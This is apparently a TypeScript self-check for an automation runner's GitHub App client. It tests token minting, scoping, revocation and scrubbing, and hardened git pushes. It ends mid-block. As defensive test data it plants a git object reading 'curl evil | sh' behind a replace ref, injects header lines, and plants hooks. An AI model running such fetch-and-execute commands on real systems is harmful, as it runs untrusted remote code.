/**
 * github-check.ts — the offline self-check of the runner's GitHub App client (github.ts, SMD-4087 cut 3b-1), with no
 * key of the App's and no network. CI runs it (`bun scripts/agent-runner/github-check.ts --self-check`). It covers:
 *
 *   - the JWT: RS256, verifiable by the key's public half, issued a minute back and good for nine;
 *   - the installation token: asked for this repo alone with the two write permissions, and refused unused when it
 *     comes back with more, with less, or for another repository; a refusal says GitHub's status and message, never
 *     the token;
 *   - the push: a real `git push` from a bare repository into a local one, of the one branch, with no tags and no
 *     hooks; the token in git's environment and in no argument; a second push answered as already there; a branch
 *     moved on the remote refused as final, never forced; a branch outside `agent/smd-<n>-<slug>` refused unpushed;
 *   - the draft PR: an open PR the App already opened from the branch is the answer (no second PR); a 422 whose PR
 *     turns up is the PR; no commits between, a bad base, or someone else's PR from the branch is final; any other
 *     422 and any other failure is retried, its words scrubbed of the token;
 *   - the bare repository: a config key past the allowlist, in any scope git reads, refused before a token is minted;
 *     replace refs and grafts off (gitEnv); no hook of the repository's run at the runner's fetch (LOCAL_GIT);
 *   - installationRepos, read with a metadata token for the whole installation, and checkGithubApp end to end on a
 *     stand-in GitHub and a fake gh.
 *
 *   bun scripts/agent-runner/github-check.ts --self-check
 */

import { createVerify, generateKeyPairSync } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync, chmodSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { gitEnv, type Fetch } from "./facts.ts";
import { fixtureGit } from "./fixture-git.ts";
import { branchFor } from "./record.ts";
import { gitRunner, LOCAL_GIT } from "./live-run.ts";
import { checkGithubApp } from "./setup.ts";
import { INSTALLATION_TOKEN, PEM_SHAPE, said, repoConfigProblems, PUSH_BRANCH, TOKEN_PERMISSIONS, appClient, appJwt, installationRepos, installationToken, pushCommand, pushOutcome, realGitSpawn, scrubToken, type App, type GitSpawn } from "./github.ts";

const NOW = Date.parse("2026-11-24T12:00:00Z");
/** A token in GitHub's stateless form (`ghs_<app id>_<JWT>`, about 520 characters, with `_`, `.` and `-`), which GitHub has minted since 2026. */
const TOKEN = `ghs_123456_eyJhbGciOiJSUzI1NiJ9.${"eyJpc3MiOiIxMjM0NTYifQ-_".repeat(18)}.${"c2lnbmF0dXJl".repeat(8)}`;
/** The legacy form, 40 characters. */
const LEGACY = `ghs_${"T0k3nL3gacy".repeat(3)}abc`;
const APP: App & { botLogin: string } = { appId: "123456", installationId: "7890", repo: "MHarris-SgyMd/OB1", botLogin: "ob1-agent-runner[bot]" };
const BRANCH = "agent/smd-1234-fix-the-thing";

type Sent = { url: string; init: RequestInit };
const json = (body: unknown, status = 200): Response => new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });
const tokenAnswer = (over: Record<string, unknown> = {}): Response =>
  json({ token: TOKEN, expires_at: "2026-11-24T13:00:00Z", permissions: { ...TOKEN_PERMISSIONS, metadata: "read" }, repository_selection: "selected", repositories: [{ full_name: "MHarris-SgyMd/OB1" }], ...over }, 201);
const prRow = (over: Record<string, unknown> = {}) => ({ number: 901, html_url: "https://github.com/MHarris-SgyMd/OB1/pull/901", user: { login: "ob1-agent-runner[bot]" }, head: { ref: BRANCH, repo: { full_name: "MHarris-SgyMd/OB1" } }, ...over });

/** A stand-in GitHub API: answers by route from `routes`, recording each request. */
function stubFetch(routes: (method: string, url: string, body: unknown) => Response | Promise<Response>): { fetch: Fetch; sent: Sent[] } {
  const sent: Sent[] = [];
  const fetch: Fetch = async (url, init = {}) => {
    sent.push({ url, init });
    const method = init.method ?? "GET";
    const body = typeof init.body === "string" ? JSON.parse(init.body) : undefined;
    return routes(method, url, body);
  };
  return { fetch, sent };
}

export async function selfCheck(): Promise<number> {
  let passed = 0;
  let failed = 0;
  const ok = (cond: unknown, what: string): void => {
    if (cond) passed++;
    else failed++;
    console.log(`  ${cond ? "✓" : "✗"} ${what}`);
  };
  const section = async (name: string, fn: () => void | Promise<void>): Promise<void> => {
    console.log(name);
    try {
      await fn();
    } catch (e) {
      failed++;
      console.log(`  ✗ ${name}: it threw (${String((e as Error)?.stack ?? (e as Error)?.message ?? e).slice(0, 300)})`);
    }
  };

  const { privateKey, publicKey } = generateKeyPairSync("rsa", { modulusLength: 2048, publicKeyEncoding: { type: "spki", format: "pem" }, privateKeyEncoding: { type: "pkcs1", format: "pem" } });
  const pkcs8 = generateKeyPairSync("rsa", { modulusLength: 2048, privateKeyEncoding: { type: "pkcs8", format: "pem" }, publicKeyEncoding: { type: "spki", format: "pem" } }).privateKey;
  const PEM = privateKey.trim();
  const tokenRoute = (method: string, url: string): Response | null =>
    method === "POST" && url === "https://api.github.com/app/installations/7890/access_tokens" ? tokenAnswer() : method === "DELETE" && url === "https://api.github.com/installation/token" ? new Response(null, { status: 204 }) : null;
  /** The requests that revoked a token, by the token they carried. */
  const revoked = (sent: Sent[]): string[] => sent.filter((x) => x.init.method === "DELETE" && x.url === "https://api.github.com/installation/token").map((x) => String((x.init.headers as Record<string, string>).Authorization).replace(/^Bearer /, ""));
  const mints = (sent: Sent[]): number => sent.filter((x) => x.init.method === "POST" && x.url.endsWith("/access_tokens")).length;

  await section("the key's shape, and the branches the runner pushes", () => {
    ok(PEM_SHAPE.test(PEM) && PEM_SHAPE.test(pkcs8.trim()), "a PKCS#1 key, as GitHub hands it out, and a PKCS#8 key are taken");
    ok(!PEM_SHAPE.test("ghp_" + "a".repeat(36)) && !PEM_SHAPE.test(`${PEM}\nX-Evil: 1`) && !PEM_SHAPE.test(PEM.replace("PRIVATE KEY-----\n", "PUBLIC KEY-----\n")), "a token, a key with a line after it, and a public key are refused");
    ok(PUSH_BRANCH.test(branchFor("SMD-4087", "Fix the thing")) && PUSH_BRANCH.test(BRANCH), "a branch record.ts names is one the runner pushes");
    ok(["main", "agent/smd-0-x", "agent/smd-12-", "agent/smd-12-x/../main", "refs/heads/agent/smd-1-x", "agent/smd-1-x:refs/tags/v1", "agent/smd-1-X", "v2.3.0", "agent/smd-1-x\n"].every((b) => !PUSH_BRANCH.test(b)), "main, a path out, a full ref, a refspec, upper case, a tag and a newline are refused");
  });

  await section("appJwt: RS256, verifiable, issued a minute back and good for nine", () => {
    const jwt = appJwt("123456", PEM, NOW);
    const [h, c, sig] = jwt.split(".");
    const dec = (s: string) => JSON.parse(Buffer.from(s.replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf8"));
    const head = dec(h);
    const claims = dec(c);
    ok(head.alg === "RS256" && head.typ === "JWT", "the header names RS256");
    ok(claims.iss === "123456" && claims.iat === NOW / 1000 - 60 && claims.exp - claims.iat === 540, "issued by the App, a minute back, for nine minutes");
    const v = createVerify("RSA-SHA256");
    v.update(`${h}.${c}`);
    ok(v.verify(publicKey, Buffer.from(sig.replace(/-/g, "+").replace(/_/g, "/"), "base64")), "the signature verifies with the key's public half");
    ok(!jwt.includes("=") && !jwt.includes("+") && !jwt.includes("/"), "base64url, unpadded");
  });

  await section("installationToken: asked for this repo alone, with the two write permissions", async () => {
    const f = stubFetch((m, u) => tokenRoute(m, u) ?? json({ message: "unrouted" }, 404));
    const t = await installationToken(f.fetch, APP, PEM, NOW);
    ok(t.ok && t.token === TOKEN, "a clean answer is the token");
    ok(TOKEN.length > 500 && INSTALLATION_TOKEN.test(TOKEN) && INSTALLATION_TOKEN.test(LEGACY), "the stateless form (over 500 characters, with _ . -) and the legacy 40 are both tokens");
    ok(!INSTALLATION_TOKEN.test("ghp_" + "a".repeat(40)) && !INSTALLATION_TOKEN.test(`${LEGACY}\r\nX-Evil: 1`) && !INSTALLATION_TOKEN.test(`${LEGACY} x`) && !INSTALLATION_TOKEN.test("ghs_" + "a".repeat(5000)), "another kind of token, one with a header line after it, a space, or 5,000 characters is not");
    const req = f.sent[0];
    const body = JSON.parse(String(req.init.body));
    ok(f.sent.length === 1 && req.init.method === "POST" && req.url === "https://api.github.com/app/installations/7890/access_tokens", "one POST to the installation's access_tokens");
    ok(JSON.stringify(body) === JSON.stringify({ repositories: ["OB1"], permissions: { contents: "write", pull_requests: "write" } }), "it asks for this repo alone, contents and pull_requests write, nothing else");
    const auth = (req.init.headers as Record<string, string>).Authorization;
    ok(auth.startsWith("Bearer ") && auth.slice(7).split(".").length === 3, "the JWT goes in the Authorization header");
    ok(req.init.redirect === "manual" && (req.init as { verbose?: boolean }).verbose === false, "no redirect followed, no headers logged (SAFE_REQUEST)");
  });

  await section("installationToken: a token with more, with less, or for another repo is refused unused", async () => {
    const answer = async (r: Response) => installationToken(stubFetch(() => r).fetch, APP, PEM, NOW);
    const cases: [string, Response, string][] = [
      ["workflows", tokenAnswer({ permissions: { ...TOKEN_PERMISSIONS, metadata: "read", workflows: "write" } }), "more: workflows: write"],
      ["administration", tokenAnswer({ permissions: { ...TOKEN_PERMISSIONS, metadata: "read", administration: "read" } }), "more: administration: read"],
      ["metadata write", tokenAnswer({ permissions: { ...TOKEN_PERMISSIONS, metadata: "write" } }), "more: metadata: write"],
      ["no pull_requests", tokenAnswer({ permissions: { contents: "write", metadata: "read" } }), "missing: pull_requests"],
      ["contents read", tokenAnswer({ permissions: { contents: "read", pull_requests: "write" } }), "contents: read"],
      ["no permissions", tokenAnswer({ permissions: null }), "(none listed)"],
    ];
    for (const [what, res, says] of cases) {
      const t = await answer(res);
      ok(!t.ok && t.detail.includes(says) && t.detail.includes("refused unused") && !t.detail.includes(TOKEN), `${what}: refused, saying ${JSON.stringify(says)}, the token unshown`);
    }
    const f = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ permissions: { ...TOKEN_PERMISSIONS, workflows: "write" } })));
    await installationToken(f.fetch, APP, PEM, NOW);
    ok(revoked(f.sent).join() === TOKEN, "a token refused for its permissions is revoked, not left for its hour");
    const g = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ repositories: [{ full_name: "someone/OB1" }] })));
    await installationToken(g.fetch, APP, PEM, NOW);
    ok(revoked(g.sent).join() === TOKEN, "a token refused for its repository is revoked too");
    const future = `ghs_${"f".repeat(5000)}`;
    const h = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ token: future })));
    const t3 = await installationToken(h.fetch, APP, PEM, NOW);
    ok(!t3.ok && revoked(h.sent).join() === future && !t3.detail.includes("fffff"), "a ghs_ token of a shape this code doesn't know is revoked before it is refused, and not shown");
    const two = await answer(tokenAnswer({ repositories: [{ full_name: "MHarris-SgyMd/OB1" }, { full_name: "MHarris-SgyMd/other" }] }));
    const other = await answer(tokenAnswer({ repositories: [{ full_name: "someone/OB1" }] }));
    const none = await answer(tokenAnswer({ repositories: undefined }));
    ok([two, other, none].every((t) => !t.ok && t.detail.includes("MHarris-SgyMd/OB1 alone")), "two repositories, another one, or none listed: refused");
    const shape = await answer(tokenAnswer({ token: "ghp_notaninstallationtoken0000000000000000" }));
    ok(!shape.ok && shape.detail.includes("expected shape") && !shape.detail.includes("ghp_"), "a token of another shape is refused, unshown");
  });

  await section("installationToken: GitHub's refusals and a broken transport come back as words, never thrown", async () => {
    const r401 = await installationToken(stubFetch(() => json({ message: "A JSON web token could not be decoded", documentation_url: "x" }, 401)).fetch, APP, PEM, NOW);
    ok(!r401.ok && r401.detail === "GitHub answered 401 (minting an installation token): A JSON web token could not be decoded", "a 401 says the status and GitHub's message");
    const html = await installationToken(stubFetch(() => new Response("<html>secret-ish</html>", { status: 502 })).fetch, APP, PEM, NOW);
    ok(!html.ok && html.detail === "GitHub answered 502 (minting an installation token)", "a body that isn't JSON is not quoted");
    const notJson = await installationToken(stubFetch(() => new Response("nope", { status: 201 })).fetch, APP, PEM, NOW);
    ok(!notJson.ok && notJson.detail.includes("isn't a JSON object"), "a 201 that isn't JSON is refused");
    const thrown = await installationToken(async () => { throw new Error("getaddrinfo ENOTFOUND api.github.com"); }, APP, PEM, NOW);
    ok(!thrown.ok && thrown.detail.includes("ENOTFOUND"), "a transport failure is a result");
    const badKey = await installationToken(stubFetch(() => tokenAnswer()).fetch, APP, "-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----", NOW);
    ok(!badKey.ok && badKey.detail.includes("couldn't sign"), "a key that can't sign is said, and nothing is sent");
  });

  await section("hostile answers: values whose String() throws, a token with a line end, GitHub's words with escapes", async () => {
    const hostile = { toString: () => { throw new Error("No default value"); } };
    // These answers skip the parser, so each hostile value reaches the code's own reads as itself (JSON would turn it into {}).
    const f = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : ({ status: 201, json: async () => ({ token: TOKEN, permissions: { ...TOKEN_PERMISSIONS, metadata: "read" }, repositories: [hostile] }) } as unknown as Response)));
    const a = await installationToken(f.fetch, APP, PEM, NOW);
    ok(!a.ok && revoked(f.sent).join() === TOKEN, "a repositories entry whose String() throws is refused and the token revoked, not thrown");
    const g = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : ({ status: 201, json: async () => ({ token: TOKEN, permissions: { ...TOKEN_PERMISSIONS, admin: hostile }, repositories: [{ full_name: "MHarris-SgyMd/OB1" }] }) } as unknown as Response)));
    let threw = false;
    let b: Awaited<ReturnType<typeof installationToken>> | null = null;
    try {
      b = await installationToken(g.fetch, APP, PEM, NOW);
    } catch {
      threw = true;
    }
    ok(!threw && b !== null && !b.ok && revoked(g.sent).join() === TOKEN, "a permission value whose String() throws: refused, revoked, never thrown");
    const trap = new Proxy({}, { ownKeys: () => { throw new Error("trap"); } });
    const p = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : ({ status: 201, json: async () => ({ token: TOKEN, permissions: trap, repositories: [{ full_name: "MHarris-SgyMd/OB1" }] }) } as unknown as Response)));
    let threw2 = false;
    let d: Awaited<ReturnType<typeof installationToken>> | null = null;
    try {
      d = await installationToken(p.fetch, APP, PEM, NOW);
    } catch {
      threw2 = true;
    }
    ok(!threw2 && d !== null && !d.ok && d.detail.includes("couldn't be read") && revoked(p.sent).join() === TOKEN, "permissions that throw when read: the token revoked, a result, never a throw");
    const h = stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ token: `${TOKEN}\n` })));
    const c = await installationToken(h.fetch, APP, PEM, NOW);
    ok(!c.ok && revoked(h.sent).join() === TOKEN, "a token with a stray line end is refused, and revoked as itself");
    const esc = await installationToken(stubFetch(() => json({ message: `bad \x1b[2J\x1b]0;title\x07 ${TOKEN.slice(0, 120)}\n✓ fake` }, 401)).fetch, APP, PEM, NOW);
    ok(!esc.ok && !/[\x1b\x07\n]/.test(esc.detail) && esc.detail.includes("<U+001B>"), "GitHub's words show escapes as <U+XXXX> and no line break");
    const perm = await installationToken(stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ permissions: { ...TOKEN_PERMISSIONS, [`x\x1b[31m${TOKEN}`]: "write" } }))).fetch, APP, PEM, NOW);
    ok(!perm.ok && !perm.detail.includes("\x1b") && !perm.detail.includes(TOKEN.slice(4, 24)), "a permission key carrying escapes and the token shows neither");
    const legacyTail = `${"x".repeat(25)}${LEGACY.slice(4)}`;
    const lv = await installationToken(stubFetch((m) => (m === "DELETE" ? new Response(null, { status: 204 }) : tokenAnswer({ token: LEGACY, permissions: { ...TOKEN_PERMISSIONS, admin: legacyTail } }))).fetch, APP, PEM, NOW);
    ok(!lv.ok && !lv.detail.includes(LEGACY.slice(4, 24)), "a permission value carrying the token's tail past its cut is scrubbed before it is cut");
    ok(said(hostile) === "(a value that can't be shown)" && said("a\nb") === "a b", "said: a value whose String() throws, and a line break");
  });

  await section("scrubToken: the token, its basic-auth form and any other GitHub token", () => {
    const basic = Buffer.from(`x-access-token:${TOKEN}`).toString("base64");
    const other = TOKEN.replace("123456", "654321");
    // Three lengths, so base64 pads by 0, 1 and 2 somewhere among them.
    for (const tok of [TOKEN, `${TOKEN}a`, `${TOKEN}ab`]) {
      for (const raw of [`x-access-token:${tok}`, tok]) {
        const b64 = Buffer.from(raw).toString("base64");
        const forms = [b64, b64.replace(/=+$/, ""), Buffer.from(raw).toString("base64url")];
        ok(Buffer.from(raw).toString("base64url") === b64.replace(/=+$/, ""), "a token's characters never make + or / in base64, so its url-safe form is its unpadded one");
        ok(forms.every((x) => !scrubToken(`< ${x}>`, tok).includes(x.slice(0, 40))), `base64 of ${raw.startsWith("x-") ? "the basic-auth form" : "the token alone"} (pad ${(3 - (raw.length % 3)) % 3}), padded and unpadded, is scrubbed`);
      }
    }
    ok(!scrubToken(`tail ${TOKEN.slice(4)} end`, TOKEN).includes(TOKEN.slice(4, 44)), "the token's tail past ghs_ is scrubbed");
    ok(["x", "9", "%3A", "TOKEN_"].every((pre) => !scrubToken(`${pre}${other}`, null).includes(other.slice(4, 30))), "another GitHub token right after a letter, a digit or an encoded colon is masked too");
    const s = scrubToken(`a ${TOKEN} b AUTHORIZATION: basic ${basic} c ghp_${"x".repeat(36)} d github_pat_${"y_".repeat(15)} e ${other} f`, TOKEN);
    ok(!s.includes(TOKEN) && !s.includes(basic) && !s.includes("ghp_x") && !s.includes("github_pat_y") && !s.includes("eyJ"), "none of them is left, another stateless token's JWT part included");
  });

  await section("pushCommand: the token in git's environment, in no argument; one refspec, no tags, no hooks, no force", () => {
    const c = pushCommand({ bareRepo: "/r/repo.git", remote: "https://github.com/MHarris-SgyMd/OB1.git", branch: BRANCH, commit: "c".repeat(40), token: TOKEN, home: "/h" });
    ok(!c.argv.join(" ").includes(TOKEN) && !c.argv.join(" ").includes("x-access-token"), "no argument carries the token");
    ok(c.env.GIT_CONFIG_COUNT === "1" && c.env.GIT_CONFIG_KEY_0 === "http.https://github.com/.extraheader" && c.env.GIT_CONFIG_VALUE_0 === `AUTHORIZATION: basic ${Buffer.from(`x-access-token:${TOKEN}`).toString("base64")}`, "the token is an extraheader scoped to https://github.com/, in the environment");
    ok(c.argv.at(-1) === `${"c".repeat(40)}:refs/heads/${BRANCH}` && c.argv.at(-2) === "https://github.com/MHarris-SgyMd/OB1.git", "one explicit refspec, the gated commit to the branch, to the remote named");
    ok(["--no-verify", "--no-follow-tags", "core.hooksPath=/dev/null", "protocol.allow=never", "credential.helper=", "http.followRedirects=false"].every((a) => c.argv.includes(a)), "hooks off, no tags, https only, no credential helper, no redirect");
    ok(!c.argv.some((a) => a === "--force" || a === "-f" || a === "--tags" || a === "--mirror" || a === "--all" || a.startsWith("+")), "no force, no tags, no mirror");
    ok(c.env.GIT_CONFIG_GLOBAL === "/dev/null" && c.env.GIT_CONFIG_NOSYSTEM === "1" && c.env.HOME === "/h", "no config of the maintainer's");
  });

  await section("pushOutcome: GitHub's own refusal is final; a remote failure is retried", () => {
    const ref = `refs/heads/${BRANCH}:refs/heads/${BRANCH}`;
    const remote = pushOutcome({ code: 1, stdout: `!\t${ref}\t[remote rejected] (refusing to allow a GitHub App to create or update workflow without workflows permission)\n`, stderr: "" }, BRANCH);
    ok(!remote.ok && remote.final && remote.detail.includes("workflows permission"), "a remote rejection (a workflow file, a ruleset) is final, in GitHub's words");
    const failure = pushOutcome({ code: 1, stdout: `!\t${ref}\t[remote failure] (remote failed to report status)\n`, stderr: "" }, BRANCH);
    ok(!failure.ok && !failure.final, "a remote failure is retried");
    const ise = pushOutcome({ code: 1, stdout: `!\t${ref}\t[remote rejected] (Internal Server Error)\n`, stderr: "" }, BRANCH);
    ok(!ise.ok && !ise.final && ise.detail.startsWith("the push failed"), "GitHub's passing error, though rejected remotely, is retried, said as a failure");
    for (const words of ["(operation timed out)", "(please try again)", "(temporarily unavailable)"]) {
      const r = pushOutcome({ code: 1, stdout: `!\t${ref}\t[remote rejected] ${words}\n`, stderr: "" }, BRANCH);
      ok(!r.ok && !r.final, `a remote rejection saying ${words} is retried`);
    }
    const nonff = pushOutcome({ code: 1, stdout: `!\t${ref}\t[rejected] (fetch first)\n`, stderr: "" }, BRANCH);
    ok(!nonff.ok && nonff.final && nonff.detail.startsWith("the push was rejected"), "a non-fast-forward is final, and said as git's rejection, not GitHub's");
  });

  await section("pushOutcome: pushed, already there, refused (final), or failed (retry)", () => {
    const ref = `refs/heads/${BRANCH}:refs/heads/${BRANCH}`;
    const out = (flag: string, code = 0, stderr = "") => ({ code, stdout: `To x\n${flag}\t${ref}\t[note]\nDone\n`, stderr });
    ok(pushOutcome(out("*"), BRANCH).ok && pushOutcome(out(" "), BRANCH).ok && pushOutcome(out("="), BRANCH).ok, "a new branch, a fast-forward and up to date are pushed");
    const rej = pushOutcome(out("!", 1), BRANCH);
    ok(!rej.ok && rej.final, "a rejection is final");
    const forced = pushOutcome(out("+"), BRANCH);
    ok(!forced.ok && !forced.final, "a forced update is never read as a push the runner made");
    const down = pushOutcome({ code: 128, stdout: "", stderr: "fatal: unable to access 'https://github.com/…': Could not resolve host" }, BRANCH);
    ok(!down.ok && !down.final && down.detail.includes("exited 128") && down.detail.includes("Could not resolve host"), "git failing before any ref is a retry, with git's words");
    const otherRef = pushOutcome({ code: 0, stdout: `*\trefs/heads/x:refs/heads/x\t[new branch]\n`, stderr: "" }, BRANCH);
    ok(!otherRef.ok, "a line for another ref doesn't count");
  });

  await section("realGitSpawn: runs /usr/bin/git from no repository", async () => {
    const r = await realGitSpawn(["--version"], { PATH: "/usr/bin:/bin", HOME: tmpdir() });
    ok(r.code === 0 && r.stdout.startsWith("git version"), "git answers its version");
  });

  const root = mkdtempSync(join(tmpdir(), "github-check-"));
  try {
    const git = fixtureGit();
    const sh = (args: string[], cwd?: string): string => {
      const r = Bun.spawnSync([git, ...args], { cwd, env: { PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1", GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" }, stdout: "pipe", stderr: "pipe" });
      if (r.exitCode !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr.toString()}`);
      return r.stdout.toString().trim();
    };
    const work = join(root, "work");
    const source = join(root, "source.git");
    const target = join(root, "target.git");
    const home = join(root, "home");
    mkdirSync(home);
    sh(["init", "-q", "-b", "main", work]);
    writeFileSync(join(work, "a.txt"), "a\n");
    sh(["add", "a.txt"], work);
    sh(["commit", "-q", "-m", "base"], work);
    sh(["checkout", "-q", "-b", BRANCH], work);
    writeFileSync(join(work, "b.txt"), "b\n");
    sh(["add", "b.txt"], work);
    sh(["commit", "-q", "-m", "the work"], work);
    sh(["tag", "v9.9.9"], work);
    sh(["clone", "-q", "--bare", work, source]);
    sh(["init", "-q", "--bare", target]);
    // A pre-push hook in the source would run on a push with hooks on: it must not.
    const marker = join(root, "pre-push-ran");
    mkdirSync(join(source, "hooks"), { recursive: true });
    writeFileSync(join(source, "hooks", "pre-push"), `#!/bin/sh\ntouch ${marker}\n`);
    chmodSync(join(source, "hooks", "pre-push"), 0o755);
    const tip = sh(["rev-parse", BRANCH], source);
    // The local remote is a path: the self-check alone allows git's file transport, after GIT_SAFE's https-only.
    const seen: { argv: string[]; env: Record<string, string> }[] = [];
    const localGit: GitSpawn = async (argv, env) => {
      seen.push({ argv, env });
      const p = Bun.spawn([git, "-c", "protocol.file.allow=always", ...argv], { cwd: "/", env, stdout: "pipe", stderr: "pipe" });
      const [stdout, stderr] = await Promise.all([new Response(p.stdout).text(), new Response(p.stderr).text()]);
      return { code: (await p.exited) ?? -1, stdout, stderr };
    };
    const mintRoute = stubFetch((m, u) => tokenRoute(m, u) ?? json({ message: "unrouted" }, 404));
    const client = appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: source, home, remote: target, now: () => NOW });

    await section("pushBranch: a real push of the one branch, no tags, no hooks; again is already there", async () => {
      const r = await client.pushBranch({ branch: BRANCH, commit: tip });
      ok(r.ok, "the push lands");
      ok(sh(["rev-parse", BRANCH], target) === tip, "the target has the branch at the run's commit");
      ok(sh(["tag", "-l"], target) === "" && sh(["for-each-ref", "--format=%(refname)"], target) === `refs/heads/${BRANCH}`, "no tag and no other branch went with it");
      ok(!existsSync(marker), "the source's pre-push hook did not run");
      const pushes = seen.filter((x) => x.argv.includes("push"));
      ok(pushes.length === 1 && seen.every((x) => !x.argv.join(" ").includes(TOKEN)) && pushes[0].env.GIT_CONFIG_VALUE_0.includes(Buffer.from(`x-access-token:${TOKEN}`).toString("base64")), "the token went in git's environment alone");
      ok(mints(mintRoute.sent) === 1 && revoked(mintRoute.sent).join() === TOKEN, "one token was minted for the push, and revoked once it was done");
      const again = await client.pushBranch({ branch: BRANCH, commit: tip });
      ok(again.ok, "a second push of the same commit is already there, not an error");
    });

    await section("pushBranch: the gated commit is what is pushed, whatever the branch ref holds by then", async () => {
      const moved = join(root, "moved-source.git");
      sh(["clone", "-q", "--bare", source, moved]);
      const base = sh(["rev-parse", `${BRANCH}~1`], moved);
      sh(["-C", moved, "update-ref", `refs/heads/${BRANCH}`, base]);
      const fresh = join(root, "pinned-target.git");
      sh(["init", "-q", "--bare", fresh]);
      const r = await appClient({ app: APP, pem: PEM, fetch: mintRoute.fetch, git: localGit, bareRepo: moved, home, remote: fresh, now: () => NOW }).pushBranch({ branch: BRANCH, commit: tip });
      ok(r.ok && sh(["rev-parse", BRANCH], fresh) === tip, "the branch ref moved back a commit; the gated commit went all the same");
      const bad = await client.pushBranch({ branch: BRANCH, commit: BRANCH });
      ok(!bad.ok && bad.final === true && bad.detail.includes("full commit id"), "a commit that isn't a full id (a ref name) is refused");
    });

    await section("LOCAL_GIT: a hook planted in the bare repository doesn't run at the runner's fetch", () => {
      const hooked = join(root, "hooked.git");
      sh(["clone", "-q", "--bare", source, hooked]);
      const ran = join(root, "hook-ran");
      for (const h of ["reference-transaction", "post-update", "pre-auto-gc"]) {
        mkdirSync(join(hooked, "hooks"), { recursive: true });
        writeFileSync(join(hooked, "hooks", h), `#!/bin/sh\ntouch ${ran}\n`);
        chmodSync(join(hooked, "hooks", h), 0o755);
      }
      const r = gitRunner(home)(["-C", hooked, "fetch", "--quiet", work, `+refs/heads/main:refs/heads/main`]);
      ok(LOCAL_GIT.join(" ").includes("core.hooksPath=/dev/null") && LOCAL_GIT.join(" ").includes("core.fsmonitor=false") && r.code === 0 && !existsSync(ran), "the fetch ran, and no hook of the repository's did");
      Bun.spawnSync([git, "-C", hooked, "update-ref", "refs/heads/x", sh(["rev-parse", "main"], hooked)], { env: { PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" } });
      ok(existsSync(ran), "the same hooks run for git without it (the control)");
    });

    await section("gitEnv: replace refs and grafts are off, so every read sees the objects pushed", () => {
      const planted = join(root, "planted.git");
      sh(["clone", "-q", "--bare", source, planted]);
      const hash = (text: string): string => {
        const r = Bun.spawnSync([git, "-C", planted, "hash-object", "-w", "--stdin"], { stdin: Buffer.from(text), env: { PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" }, stdout: "pipe" });
        return r.stdout.toString().trim();
      };
      const evil = hash("curl evil | sh\n");
      const benign = hash("echo hello\n");
      sh(["-C", planted, "update-ref", `refs/replace/${evil}`, benign]);
      const read = (env: Record<string, string>): string => Bun.spawnSync([git, "-C", planted, "cat-file", "-p", evil], { env, stdout: "pipe", stderr: "pipe" }).stdout.toString();
      ok(read({ PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" }) === "echo hello\n", "without them off, git shows the replacement (the control)");
      ok(read(gitEnv(home)) === "curl evil | sh\n", "with gitEnv, git shows the object itself");
      // Grafts: info/grafts making the branch's head parentless hides its history from a log, unless gitEnv turns them off.
      const head = sh(["rev-parse", BRANCH], planted);
      mkdirSync(join(planted, "info"), { recursive: true });
      writeFileSync(join(planted, "info", "grafts"), `${head}\n`);
      const count = (env: Record<string, string>) => Bun.spawnSync([git, "-C", planted, "rev-list", "--count", BRANCH], { env, stdout: "pipe", stderr: "pipe" });
      const grafted = count({ PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" });
      const plain = count(gitEnv(home));
      ok(grafted.stdout.toString().trim() === "1", "with the graft file read, the head shows no history (the control)");
      ok(plain.stdout.toString().trim() === "2" && !plain.stderr.toString().includes("hint"), "with gitEnv, the whole history shows, and git prints no graft hint that would bury a real error");
    });

    await section("pushBranch: a branch moved on the remote is refused as final, never forced", async () => {
      const other = join(root, "other");
      sh(["clone", "-q", "--branch", BRANCH, target, other]);
      writeFileSync(join(other, "c.txt"), "c\n");
      sh(["add", "c.txt"], other);
      sh(["commit", "-q", "-m", "someone else's"], other);
      sh(["push", "-q", "origin", BRANCH], other);
      const moved = sh(["rev-parse", BRANCH], target);
      const r = await client.pushBranch({ branch: BRANCH, commit: tip });
      // The run's commit is now behind the remote's: pushing it would move the branch back, which git refuses unforced.
      ok(!r.ok && r.final === true, "refused as final");
      ok(sh(["rev-parse", BRANCH], target) === moved, "the remote's branch is untouched");
      ok(!r.ok && !r.detail.includes(TOKEN.slice(4, 24)), "the refusal carries no piece of the token");
    });

    await section("pushBranch: a branch outside the runner's prefix is refused before a token is minted", async () => {
      const before = mintRoute.sent.length;
      const pushesBefore = seen.filter((x) => x.argv.includes("push")).length;
      const r = await client.pushBranch({ branch: "main", commit: tip });
      ok(!r.ok && r.final === true && r.detail.includes("agent/smd-<n>-<slug>"), "main is refused, as final");
      ok(mintRoute.sent.length === before && seen.filter((x) => x.argv.includes("push")).length === pushesBefore, "no token minted, no push run");
    });

